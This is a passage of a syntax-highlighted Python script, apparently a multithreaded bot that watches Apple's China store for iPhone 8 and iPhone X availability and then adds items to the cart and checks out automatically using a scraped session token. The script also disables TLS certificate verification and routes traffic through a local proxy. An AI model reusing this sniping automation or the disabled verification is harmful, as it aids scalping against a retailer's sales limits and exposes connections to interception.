class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div><div class=\"line\">333</div><div class=\"line\">334</div><div class=\"line\">335</div><div class=\"line\">336</div><div class=\"line\">337</div><div class=\"line\">338</div><div class=\"line\">339</div><div class=\"line\">340</div><div class=\"line\">341</div><div class=\"line\">342</div><div class=\"line\">343</div><div class=\"line\">344</div><div class=\"line\">345</div><div class=\"line\">346</div><div class=\"line\">347</div><div class=\"line\">348</div><div class=\"line\">349</div><div class=\"line\">350</div><div class=\"line\">351</div><div class=\"line\">352</div><div class=\"line\">353</div><div class=\"line\">354</div><div class=\"line\">355</div><div class=\"line\">356</div><div class=\"line\">357</div><div class=\"line\">358</div><div class=\"line\">359</div><div class=\"line\">360</div><div class=\"line\">361</div><div class=\"line\">362</div><div class=\"line\">363</div><div class=\"line\">364</div><div class=\"line\">365</div><div class=\"line\">366</div><div class=\"line\">367</div><div class=\"line\">368</div><div class=\"line\">369</div><div class=\"line\">370</div><div class=\"line\">371</div><div class=\"line\">372</div><div class=\"line\">373</div><div class=\"line\">374</div><div class=\"line\">375</div><div class=\"line\">376</div><div class=\"line\">377</div><div class=\"line\">378</div><div class=\"line\">379</div><div class=\"line\">380</div><div class=\"line\">381</div><div class=\"line\">382</div><div class=\"line\">383</div><div class=\"line\">384</div><div class=\"line\">385</div><div class=\"line\">386</div><div class=\"line\">387</div><div class=\"line\">388</div><div class=\"line\">389</div><div class=\"line\">390</div><div class=\"line\">391</div><div class=\"line\">392</div><div class=\"line\">393</div><div class=\"line\">394</div><div class=\"line\">395</div><div class=\"line\">396</div><div class=\"line\">397</div><div class=\"line\">398</div><div class=\"line\">399</div><div class=\"line\">400</div><div class=\"line\">401</div><div class=\"line\">402</div><div class=\"line\">403</div><div class=\"line\">404</div><div class=\"line\">405</div><div class=\"line\">406</div><div class=\"line\">407</div><div class=\"line\">408</div><div class=\"line\">409</div><div class=\"line\">410</div><div class=\"line\">411</div><div class=\"line\">412</div><div class=\"line\">413</div><div class=\"line\">414</div><div class=\"line\">415</div><div class=\"line\">416</div><div class=\"line\">417</div><div class=\"line\">418</div><div class=\"line\">419</div><div class=\"line\">420</div><div class=\"line\">421</div><div class=\"line\">422</div><div class=\"line\">423</div><div class=\"line\">424</div><div class=\"line\">425</div><div class=\"line\">426</div><div class=\"line\">427</div><div class=\"line\">428</div><div class=\"line\">429</div><div class=\"line\">430</div><div class=\"line\">431</div><div class=\"line\">432</div><div class=\"line\">433</div><div class=\"line\">434</div><div class=\"line\">435</div><div class=\"line\">436</div><div class=\"line\">437</div><div class=\"line\">438</div><div class=\"line\">439</div><div class=\"line\">440</div><div class=\"line\">441</div><div class=\"line\">442</div><div class=\"line\">443</div><div class=\"line\">444</div><div class=\"line\">445</div><div class=\"line\">446</div><div class=\"line\">447</div><div class=\"line\">448</div><div class=\"line\">449</div><div class=\"line\">450</div><div class=\"line\">451</div><div class=\"line\">452</div><div class=\"line\">453</div><div class=\"line\">454</div><div class=\"line\">455</div><div class=\"line\">456</div><div class=\"line\">457</div><div class=\"line\">458</div><div class=\"line\">459</div><div class=\"line\">460</div><div class=\"line\">461</div><div class=\"line\">462</div><div class=\"line\">463</div><div class=\"line\">464</div><div class=\"line\">465</div><div class=\"line\">466</div><div class=\"line\">467</div><div class=\"line\">468</div><div class=\"line\">469</div><div class=\"line\">470</div><div class=\"line\">471</div><div class=\"line\">472</div><div class=\"line\">473</div><div class=\"line\">474</div><div class=\"line\">475</div><div class=\"line\">476</div><div class=\"line\">477</div><div class=\"line\">478</div><div class=\"line\">479</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"comment\"># Author : Mr.Bingo</span></div><div class=\"line\"><span class=\"comment\"># Version : 2.0</span></div><div class=\"line\"><span class=\"comment\"># Description : </span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> pdb</div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> logging</div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> datetime,time</div><div class=\"line\"><span class=\"keyword\">from</span> requests.packages.urllib3.exceptions <span class=\"keyword\">import</span> InsecureRequestWarning</div><div class=\"line\"></div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.INFO)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#orderPath= os.path.join(os.path.split(os.path.abspath(__file__))[0],u'order')     # json文件格式订单</span></div><div class=\"line\">orderFile= os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">'order.txt'</span>)    <span class=\"comment\"># txt订单格式</span></div><div class=\"line\"><span class=\"comment\">#   lastName | firstName | phone | email | state | city | district | street | payment | product | color | capacity | quantity</span></div><div class=\"line\"><span class=\"comment\">#   邓 | 六 | 15000555000 | test3@oddboy.cn | 北京 | 北京 | 海淀区 | XXX路17号 | Alipay | iphone8 | glod | 256gb | 2</span></div><div class=\"line\">orderResult = os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">'order-Result.csv'</span>)  <span class=\"comment\"># 成功订单</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># orderSuccess = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Success.txt')  # 成功订单</span></div><div class=\"line\"><span class=\"comment\"># orderFail = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Fail.txt')  # 失败订单</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">iPhoneBuyer</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"comment\"># 初始化</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.dispData=[]    <span class=\"comment\"># list</span></div><div class=\"line\">        self.threadLock = threading.Lock()  <span class=\"comment\"># 进程锁，主要用于写文件！</span></div><div class=\"line\">        <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># 多线程情况下美化，格式化输出消息。</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># 开启多线程 一个订单一个线程</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_Threads</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        thread_arr=[]       <span class=\"comment\"># 线程列表</span></div><div class=\"line\">        threading.Thread(target=self.display)     </div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\"># json文件格式订单读取</span></div><div class=\"line\">        <span class=\"comment\"># logging.info(\"\\r[info] Order Path : %s \"%orderPath[:80])</span></div><div class=\"line\">        <span class=\"comment\"># for dirpath,dirname,files in os.walk(orderPath):</span></div><div class=\"line\">        <span class=\"comment\">#     print(files)</span></div><div class=\"line\">        <span class=\"comment\">#     for f in files:</span></div><div class=\"line\">        <span class=\"comment\">#         if re.match(r'^order.*\\.json$',f):</span></div><div class=\"line\">        <span class=\"comment\">#             f=os.path.join(orderPath,f)</span></div><div class=\"line\">        <span class=\"comment\">#             logging.info(f)</span></div><div class=\"line\">        <span class=\"comment\">#             with open(f,encoding='utf-8') as fp:</span></div><div class=\"line\">        <span class=\"comment\">#                 order=json.load(fp)</span></div><div class=\"line\">        <span class=\"comment\">#                 order['fileFullName']= f</span></div><div class=\"line\">        <span class=\"comment\">#                 logging.debug(order)</span></div><div class=\"line\">        <span class=\"comment\">#                 print(\"\\n&gt; order's phone :: \"+order['phone'])</span></div><div class=\"line\">        <span class=\"comment\">#                 #pdb.set_trace()</span></div><div class=\"line\">        <span class=\"comment\">#                 t=threading.Thread(target=self.buy,args=(order,))</span></div><div class=\"line\">        <span class=\"comment\">#                 thread_arr.append(t)</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(orderFile):</div><div class=\"line\">            print(<span class=\"string\">\"没有订单文件！！！\"</span>)</div><div class=\"line\">            sys.exit(<span class=\"number\">0</span>)</div><div class=\"line\">        </div><div class=\"line\">        <span class=\"keyword\">with</span> open(orderFile,encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> fp:</div><div class=\"line\">            raw_orders = fp.readlines()</div><div class=\"line\">            tmp = <span class=\"keyword\">False</span></div><div class=\"line\">            <span class=\"keyword\">for</span> raw_order <span class=\"keyword\">in</span> raw_orders:</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> tmp:</div><div class=\"line\">                    tmp =<span class=\"keyword\">True</span></div><div class=\"line\">                    <span class=\"keyword\">continue</span>    <span class=\"comment\"># 跳过order.txt文件的第一行</span></div><div class=\"line\">              </div><div class=\"line\">                raw_order = str(raw_order).replace(<span class=\"string\">' '</span>,<span class=\"string\">''</span>)  <span class=\"comment\"># 删除所有空格</span></div><div class=\"line\">                logging.debug(raw_order)</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> re.match(<span class=\"string\">r'^((.*?\\|)&#123;13&#125;)'</span>,raw_order):      <span class=\"comment\"># 简单检查订单格式</span></div><div class=\"line\">                    <span class=\"keyword\">continue</span></div><div class=\"line\">                l = raw_order.split(<span class=\"string\">\"|\"</span>)</div><div class=\"line\">                order=&#123;&#125;</div><div class=\"line\">                order[<span class=\"string\">'lastName'</span>] = l[<span class=\"number\">0</span>]</div><div class=\"line\">                order[<span class=\"string\">'firstName'</span>] = l[<span class=\"number\">1</span>]</div><div class=\"line\">                order[<span class=\"string\">'phone'</span>] = l[<span class=\"number\">2</span>]</div><div class=\"line\">                order[<span class=\"string\">'email'</span>] = l[<span class=\"number\">3</span>]</div><div class=\"line\">                order[<span class=\"string\">'state'</span>] = l[<span class=\"number\">4</span>]</div><div class=\"line\">                order[<span class=\"string\">'city'</span>] = l[<span class=\"number\">5</span>]</div><div class=\"line\">                order[<span class=\"string\">'district'</span>] = l[<span class=\"number\">6</span>]</div><div class=\"line\">                order[<span class=\"string\">'street'</span>] = l[<span class=\"number\">7</span>]</div><div class=\"line\">                order[<span class=\"string\">'payment'</span>] = l[<span class=\"number\">8</span>]</div><div class=\"line\">                order[<span class=\"string\">'product'</span>] = l[<span class=\"number\">9</span>]</div><div class=\"line\">                order[<span class=\"string\">'color'</span>] = l[<span class=\"number\">10</span>]</div><div class=\"line\">                order[<span class=\"string\">'capacity'</span>] = l[<span class=\"number\">11</span>]</div><div class=\"line\">                order[<span class=\"string\">'quantity'</span>] = l[<span class=\"number\">12</span>]</div><div class=\"line\">                logging.debug(order)</div><div class=\"line\">                t=threading.Thread(target=self.buy,args=(order,))</div><div class=\"line\">                thread_arr.append(t)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> range(len(thread_arr)):</div><div class=\"line\">            thread_arr[t].start()       <span class=\"comment\"># 启动线程。         </span></div><div class=\"line\">        </div><div class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> range(len(thread_arr)):</div><div class=\"line\">            thread_arr[t].join()        <span class=\"comment\"># 收拢</span></div><div class=\"line\">        <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># 处理购买</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">buy</span><span class=\"params\">(self,order)</span>:</span></div><div class=\"line\">        retryTime = <span class=\"number\">5</span>       <span class=\"comment\"># 请求失败后重试次数</span></div><div class=\"line\">        retryTimeout = <span class=\"number\">30</span>     <span class=\"comment\"># 全局超时时间</span></div><div class=\"line\">        orderIdentify = order[<span class=\"string\">'lastName'</span>]+order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\"&lt;\"</span>+order[<span class=\"string\">'product'</span>]+<span class=\"string\">\"/\"</span>+ order[<span class=\"string\">'color'</span>]+<span class=\"string\">\"/\"</span>+order[<span class=\"string\">'capacity'</span>]+<span class=\"string\">\"&gt; || \"</span></div><div class=\"line\">        <span class=\"comment\"># n = 0         # 测试代码</span></div><div class=\"line\">        <span class=\"comment\"># while n &lt; 5:</span></div><div class=\"line\">        <span class=\"comment\">#     print(threading.current_thread().name)</span></div><div class=\"line\">        <span class=\"comment\">#     n = n + 1</span></div><div class=\"line\">        <span class=\"comment\">#     time.sleep(1)</span></div><div class=\"line\">        <span class=\"comment\"># return </span></div><div class=\"line\">        userAgent=<span class=\"string\">\"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)\"</span>   <span class=\"comment\"># aywysya可能需要与此值匹配。</span></div><div class=\"line\">        cookies=&#123;&#125;</div><div class=\"line\">        proxies=&#123;</div><div class=\"line\">            <span class=\"string\">\"http\"</span>: <span class=\"string\">\"http://127.0.0.1:8080\"</span>,     <span class=\"comment\"># 本地监听</span></div><div class=\"line\">            <span class=\"string\">\"https\"</span>: <span class=\"string\">\"https://127.0.0.1:8080\"</span></div><div class=\"line\">        &#125;</div><div class=\"line\">        print(<span class=\"string\">'order :: '</span>+order[<span class=\"string\">'lastName'</span>]+order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\"\\t\"</span>+order[<span class=\"string\">'email'</span>]+<span class=\"string\">\"\\t%15s\\t%15s\\t%15s\"</span>%(order[<span class=\"string\">'product'</span>],order[<span class=\"string\">'capacity'</span>],order[<span class=\"string\">'color'</span>]) )</div><div class=\"line\">        time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> order[<span class=\"string\">'product'</span>]==<span class=\"string\">\"iphone8\"</span> <span class=\"keyword\">or</span> order[<span class=\"string\">'product'</span>]==<span class=\"string\">'iphone8plus'</span>:</div><div class=\"line\">            url=<span class=\"string\">\"https://www.apple.com/cn/shop/buy-iphone/iphone-8\"</span></div><div class=\"line\">        <span class=\"keyword\">elif</span> order[<span class=\"string\">'product'</span>]==<span class=\"string\">'iphonex'</span>:</div><div class=\"line\">            <span class=\"comment\">#if datetime.datetime.now().timestamp() &lt; datetime.datetime(2017,10,27,15,0).timestamp():    #从时间判断是否起售</span></div><div class=\"line\">            tmp= datetime.datetime(<span class=\"number\">2017</span>,<span class=\"number\">10</span>,<span class=\"number\">27</span>,<span class=\"number\">6</span>,<span class=\"number\">58</span>).timestamp()-time.timezone - datetime.datetime.now().timestamp()</div><div class=\"line\">            <span class=\"keyword\">if</span> tmp&gt;<span class=\"number\">0</span>:  <span class=\"comment\"># UTC时间！   </span></div><div class=\"line\">                print(orderIdentify+<span class=\"string\">\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"</span>%(tmp/<span class=\"number\">60</span>))</div><div class=\"line\">                <span class=\"keyword\">return</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                url=<span class=\"string\">\"https://www.apple.com/cn/shop/buy-iphone/iphone-x\"</span></div><div class=\"line\"></div><div class=\"line\">        session=requests.session()      <span class=\"comment\"># session会话可以自动保存和处理cookie</span></div><div class=\"line\">        session.proxies=proxies</div><div class=\"line\">        session.verify=<span class=\"keyword\">False</span></div><div class=\"line\">        session.timeout=<span class=\"number\">30</span>          <span class=\"comment\"># 此处设置timeout无用</span></div><div class=\"line\">        session.headers=&#123;<span class=\"string\">'User-Agent'</span>:userAgent&#125;</div><div class=\"line\">        <span class=\"comment\"># https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/</span></div><div class=\"line\">        session.mount(<span class=\"string\">'https://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))     <span class=\"comment\"># 实际会重试 max_retries +1 次   所以将retry次数先减1</span></div><div class=\"line\">        session.mount(<span class=\"string\">'http://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\"># logging.debug(\"GET请求 :: %s\"%url)</span></div><div class=\"line\">        <span class=\"comment\">#r = session.get(url,timeout=reqTimeout)</span></div><div class=\"line\">        <span class=\"comment\"># logging.info(\"获得cookie :: %s\"%print(r.cookies)[:80])</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\"># 在products.json中遍历对应产品,PS:从网页获取比较麻烦。</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">\"products.json\"</span>)):</div><div class=\"line\">            print(<span class=\"string\">\"\\n\\t\\tproducts.json文件不存在！\\n\"</span>)</div><div class=\"line\">            sys.exit(<span class=\"number\">0</span>)</div><div class=\"line\">        currentProduct=&#123;&#125;</div><div class=\"line\">        <span class=\"keyword\">with</span> open(os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">\"products.json\"</span>),encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> productFileHandle:    </div><div class=\"line\">            products = json.load(productFileHandle)</div><div class=\"line\">            <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> products:</div><div class=\"line\">                <span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\">                <span class=\"keyword\">if</span> p[<span class=\"string\">'productLocatorFamily'</span>]==order[<span class=\"string\">'product'</span>] <span class=\"keyword\">and</span> p[<span class=\"string\">'dimensionCapacity'</span>]==order[<span class=\"string\">'capacity'</span>] <span class=\"keyword\">and</span> p[<span class=\"string\">'dimensionColor'</span>]==order[<span class=\"string\">'color'</span>]:</div><div class=\"line\">                    logging.debug(<span class=\"string\">\"产品型号 : %s\\t%s\"</span>%(p[<span class=\"string\">'partNumber'</span>],p[<span class=\"string\">'seoUrlToken'</span>])[:<span class=\"number\">80</span>])</div><div class=\"line\">                    currentProduct=p</div><div class=\"line\">                    <span class=\"keyword\">break</span>   <span class=\"comment\"># 找到相应产品，退出for循环</span></div><div class=\"line\">            <span class=\"keyword\">if</span> len(currentProduct) == <span class=\"number\">0</span>:</div><div class=\"line\">                print(<span class=\"string\">\"未找到相应产品\\t%s\\t%s\\t%s\"</span>%(order[<span class=\"string\">'product'</span>],order[<span class=\"string\">'capacity'</span>],order[<span class=\"string\">'color'</span>]) )</div><div class=\"line\">                <span class=\"keyword\">return</span></div><div class=\"line\">            <span class=\"comment\"># close products.json</span></div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">        <span class=\"comment\">#if True:</span></div><div class=\"line\">            <span class=\"comment\"># 验证是否启售</span></div><div class=\"line\">            <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\"></div><div class=\"line\">                <span class=\"comment\"># 重试方式，但太复杂，且用修饰器也并不好实现。</span></div><div class=\"line\">                <span class=\"comment\"># n = 0</span></div><div class=\"line\">                <span class=\"comment\"># while n&lt;retryTime:</span></div><div class=\"line\">                <span class=\"comment\">#     try:</span></div><div class=\"line\">                <span class=\"comment\">#         r=session.get(\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber'],timeout=reqTimeout)</span></div><div class=\"line\">                <span class=\"comment\">#         n = n + 10000       # 请求成功，跳出循环</span></div><div class=\"line\">                <span class=\"comment\">#     except Exception as e:</span></div><div class=\"line\">                <span class=\"comment\">#         n = n + 1</span></div><div class=\"line\">                <span class=\"comment\">#         if n&gt;=retryTime:</span></div><div class=\"line\">                <span class=\"comment\">#         print(\"重试次数过多！！！ &lt;退出&gt;\")</span></div><div class=\"line\">                <span class=\"comment\">#         return</span></div><div class=\"line\">                <span class=\"comment\"># end while</span></div><div class=\"line\">                order[<span class=\"string\">'remark'</span>]=<span class=\"string\">'出师未捷 :: '</span>+<span class=\"string\">\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"</span>+currentProduct[<span class=\"string\">'partNumber'</span>]</div><div class=\"line\">                logging.debug(<span class=\"string\">\"\\n%s\\n\"</span>%currentProduct)</div><div class=\"line\">                r=session.get(<span class=\"string\">\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"</span>+currentProduct[<span class=\"string\">'partNumber'</span>],timeout=retryTimeout)</div><div class=\"line\">                logging.debug(r.text)</div><div class=\"line\">                deliveryMsg = json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)</div><div class=\"line\">                <span class=\"comment\">#print(orderIdentify+\"%s  %s\"%(deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy'],deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages']))</span></div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'未发售'</span> <span class=\"keyword\">in</span> deliveryMsg[<span class=\"string\">'body'</span>][<span class=\"string\">'content'</span>][<span class=\"string\">'deliveryMessage'</span>][currentProduct[<span class=\"string\">'partNumber'</span>]][<span class=\"string\">'deliveryOptionMessages'</span>][<span class=\"number\">0</span>] :</div><div class=\"line\">                    print(orderIdentify+currentProduct[<span class=\"string\">'seoUrlToken'</span>]+<span class=\"string\">\" || 暂未发售\"</span>)</div><div class=\"line\">                    time.sleep(<span class=\"number\">3</span>)   <span class=\"comment\"># 隔三秒钟</span></div><div class=\"line\">                <span class=\"keyword\">else</span>:</div><div class=\"line\">                    print(orderIdentify+deliveryMsg[<span class=\"string\">'body'</span>][<span class=\"string\">'content'</span>][<span class=\"string\">'deliveryMessage'</span>][currentProduct[<span class=\"string\">'partNumber'</span>]][<span class=\"string\">'orderByDeliveryBy'</span>]+deliveryMsg[<span class=\"string\">'body'</span>][<span class=\"string\">'content'</span>][<span class=\"string\">'deliveryMessage'</span>][currentProduct[<span class=\"string\">'partNumber'</span>]][<span class=\"string\">'deliveryOptionMessages'</span>][<span class=\"number\">0</span>])</div><div class=\"line\">                    <span class=\"keyword\">break</span>       <span class=\"comment\"># 起售！！！   跳出while死循环</span></div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\"># 添加购物车</span></div><div class=\"line\">            addCartUrl=url+<span class=\"string\">\"/\"</span>+currentProduct[<span class=\"string\">'seoUrlToken'</span>]+<span class=\"string\">\"?product=\"</span>+currentProduct[<span class=\"string\">'partNumber'</span>]    \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;purchaseOption=fullPrice\"</span>                                    \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;step=select\"</span>                                                 \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;dimensionCapacity=\"</span>+currentProduct[<span class=\"string\">'dimensionCapacity'</span>]      \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;dimensionColor=\"</span>+currentProduct[<span class=\"string\">'dimensionColor'</span>]            \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;part=\"</span>+currentProduct[<span class=\"string\">'part'</span>]                                \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;complete=true\"</span>                                               \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;dimensionScreensize=\"</span>+currentProduct[<span class=\"string\">'dimensionScreensize'</span>]  \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;add-to-cart=add-to-cart\"</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"添加到购物车[GET] :: %s\"</span>%addCartUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            r = session.get(addCartUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\">            <span class=\"comment\"># 访问购物车</span></div><div class=\"line\">            shopBagUrl=<span class=\"string\">\"https://www.apple.com/cn/shop/bag\"</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"访问购物车[GET] :: %s\"</span>%shopBagUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]访问购物车 :: %s\"</span>%shopBagUrl</div><div class=\"line\">            r = session.get(shopBagUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            token=re.search(<span class=\"string\">r'\\\"x-aos-stk\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            <span class=\"comment\"># requests.utils.add_dict_to_cookiejar(session.cookies,&#123;\"x-aos-stk\":token&#125;)   # 此语句是将token添加到cookie.</span></div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\"># 修改数量  可修改为2      此处cookie中需要携带x-aos-stk，应该类似于token的作用。    # 应该可以省略！！！！！ 在结账步骤可一同实现。</span></div><div class=\"line\">            <span class=\"comment\"># tmp=re.search(r'\"updateQuantity\":&#123;\"url\":\"(/cn/shop/bagx\\?_a=updateQuantity&amp;_m=(shoppingCart.items.item-.*?))\"',r.text)</span></div><div class=\"line\">            <span class=\"comment\"># updateQuantityUrl=\"https://www.apple.com\"+tmp.group(1)</span></div><div class=\"line\">            <span class=\"comment\"># if order['quantity']=='2':</span></div><div class=\"line\">            <span class=\"comment\">#     r= session.post(updateQuantityUrl,data=&#123;tmp.group(2)+\".quantity\":\"2\"&#125;,headers=&#123;\"x-aos-stk\":token&#125;,timeout=reqTimeout)</span></div><div class=\"line\">                </div><div class=\"line\">            <span class=\"comment\">#     #pdb.set_trace()</span></div><div class=\"line\">            <span class=\"comment\">#     print()</span></div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 结账</span></div><div class=\"line\">            tmp=re.search(<span class=\"string\">r'\\\"updateQuantity\\\":&#123;\\\"url\\\":\\\"(/cn/shop/bagx\\?_a=updateQuantity&amp;_m=(shoppingCart.items.item-.*?))\\\"'</span>,r.text)</div><div class=\"line\">            checkoutUrl=<span class=\"string\">\"https://www.apple.com/cn/shop/bagx/checkout_now?_a=checkout&amp;_m=shoppingCart\"</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"结账[POST] :: %s\"</span>%checkoutUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]结账[POST] :: %s\"</span>%checkoutUrl</div><div class=\"line\">            r= session.post(checkoutUrl,data=&#123;tmp.group(<span class=\"number\">2</span>)+<span class=\"string\">\".quantity\"</span>:order[<span class=\"string\">'quantity'</span>],<span class=\"string\">'shoppingCart.actions.fcscounter'</span>:<span class=\"string\">'NaN'</span>,<span 